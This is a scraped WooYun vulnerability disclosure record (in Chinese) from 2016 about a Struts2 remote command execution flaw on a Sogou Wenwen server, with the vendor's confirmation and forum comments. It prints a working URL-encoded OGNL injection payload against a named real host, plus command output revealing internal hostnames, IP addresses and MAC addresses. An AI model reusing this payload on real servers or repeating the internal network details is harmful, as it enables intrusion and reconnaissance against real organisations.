{"id": 74421, "wybug_id": "wooyun-2016-0170574", "wybug_title": "搜狗搜索(问问)存在远程命令执行漏洞(可穿透边界防火墙进入内网)", "wybug_corp": "搜狗", "wybug_author": "猪猪侠", "wybug_date": "2016-01-17 13:07", "wybug_open_date": "2016-02-27 11:49", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-27：\t细节向公众公开  简要描述： 搜狗搜索(问问系统)(wenen.sogou.com)存在远程命令执行漏洞，可穿透边界防火墙进入内网，听说你们被腾讯搜狗了，在不在腾讯内网呢？ 详细说明：  #1 漏洞描述(st2命令执行)地址：http://mock.wenwen.sogou.com/org/index.do\n\n   漏洞证明：  #2 利用\nhttp://mock.wenwen.sogou.com/org/index.do?redirect%3A%24%7B%23res%3D%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27)%2C%23res.setCharacterEncoding(%22UTF-8%22)%2C%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B%22echo%22%2C%22ringzero%22%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B9%5D%2C%23d.read(%23e)%2C%23res.getWriter().println(%23e)%2C%23res.getWriter().flush()%2C%23res.getWriter().close()%7D\n\nwhoami====================================================================================================================================snswenwencat /etc/hosts====================================================================================================================================127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain610.134.9.45             sjs_9_45.sogou-in.domain        sjs_9_45/sbin/ifconfig -a====================================================================================================================================eth0      Link encap:Ethernet  HWaddr 5C:F3:FC:A7:04:E8            inet addr:10.134.9.45  Bcast:10.134.15.255  Mask:255.255.248.0          inet6 addr: fe80::5ef3:fcff:fea7:4e8/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:398187733 errors:0 dropped:0 overruns:0 frame:0          TX packets:128375033 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:36697666297 (34.1 GiB)  TX bytes:20420497771 (19.0 GiB)          Memory:92a60000-92a80000 eth1      Link encap:Ethernet  HWaddr 5C:F3:FC:A7:04:E9            inet addr:10.144.9.45  Bcast:10.144.15.255  Mask:255.255.248.0          inet6 addr: fe80::5ef3:fcff:fea7:4e9/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:1496542708 errors:0 dropped:0 overruns:0 frame:0          TX packets:753954233 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:154726879148 (144.1 GiB)  TX bytes:178253899801 (166.0 GiB)          Memory:92a20000-92a40000 lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:171894323 errors:0 dropped:0 overruns:0 frame:0          TX packets:171894323 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:24459559582 (22.7 GiB)  TX bytes:24459559582 (22.7 GiB)usb0      Link encap:Ethernet  HWaddr 5E:F3:FC:A7:04:EC            BROADCAST MULTICAST  MTU:1500  Metric:1          RX packets:0 errors:0 dropped:0 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)? (10.144.15.252) at d8:67:d9:6e:5c:c1 [ether] on eth1? (10.134.15.254) at 00:00:0c:07:ac:65 [ether] on eth0? (10.134.15.250) at 70:e2:84:07:5a:ac [ether] on eth0? (10.144.15.254) at 00:00:0c:07:ac:c9 [ether] on eth1\n#3 发几个内网IP证明\n#\tIP1\t10.152.91.482\t10.152.107.413\t10.149.29.564\t10.144.77.595\t10.153.18.1166\t10.144.86.83\n   修复方案：  升级呗，难道关闭服务器不成？   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-01-17 20:59 厂商回复： 感谢支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-17 13:07 |    \t\tonpu \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:37        )\t\t \n  前排关注    \n     2016-01-17 13:09 |    \t\tFwqAdmin \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:4        )\t\t \n  火钳刘明    \n     2016-01-17 13:09 |    \t\tSubmit \t\t\t( 普通白帽子  |\t\t\t        Rank:527 漏洞数:120        | )\t\t \n  真是够6    \n     2016-01-17 13:10 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3846 漏洞数:296        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  听说你们被腾讯搜狗了，在不在腾讯内网呢？    \n     2016-01-17 13:10 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3846 漏洞数:296        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  收购    \n     2016-01-17 13:15 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1423 漏洞数:203        | 。)\t\t \n  听说你们被腾讯搜狗了，在不在腾讯内网呢？    \n     2016-01-17 13:17 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1850 漏洞数:296        | 风暴网络安全空间：http://www.heysec.or...)\t\t \n  默默给猪哥点个赞    \n     2016-01-17 13:25 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:148 漏洞数:49        | 人如果没有梦想，跟咸鱼有什么分别)\t\t \n  听说你们被腾讯搜狗了，在不在腾讯内网呢？    \n     2016-01-17 13:29 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:260 漏洞数:63        | 潜心代码审计。)\t\t \n  听说你们被腾讯搜狗了，在不在腾讯内网呢？    \n     2016-01-17 13:35 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  听说你们被腾讯搜狗了，在不在腾讯内网呢？    \n     2016-01-17 13:36 |    \t\t万年死宅 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:20        | 让生命活出精彩！)\t\t \n  大牛好，火钳留名    \n     2016-01-17 13:36 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:233 漏洞数:81        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  你这语文……    \n     2016-01-17 13:51 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:76        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  听说你们被腾讯搜狗了，在不在腾讯内网呢？    \n     2016-01-17 13:51 |    \t\tsecart \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:5        | 这个人很懒，什么都没留。)\t\t \n  听说你们被腾讯搜狗了，在不在腾讯内网呢？    \n     2016-01-17 13:53 |    \t\tAzox佐熙 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 我就混个脸熟)\t\t \n  听说你们被腾讯搜狗了，在不在腾讯内网呢？    \n     2016-01-17 14:08 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:27        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  恶趣味。。。    \n     2016-01-17 14:13 |    \t\thkcs \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:9        | 只是路过)\t\t \n  听说你们被腾讯搜狗了，在不在腾讯内网呢？    \n     2016-01-17 14:15 |    \t\t偶然 \t\t\t( 普通白帽子  |\t\t\t        Rank:282 漏洞数:72        | 我是天空里一片云。)\t\t \n  听说你们被腾讯搜狗了，在不在腾讯内网呢？    \n     2016-01-17 14:48 |    \t\t__Lee_ \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:7        | 相信未来，坚持梦想)\t\t \n  666    \n     2016-01-17 15:35 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2981 漏洞数:591        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  666666    \n     2016-01-17 18:55 |    \t\t大表哥 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 乌云第一菜鸟，从不提交洞洞)\t\t \n  爱上猪猪侠    \n     2016-01-27 09:31 |    \t\t情小北 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:7        | 那时候我们还年轻,所以任由时光作渡.)\t\t \n  火前留名    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}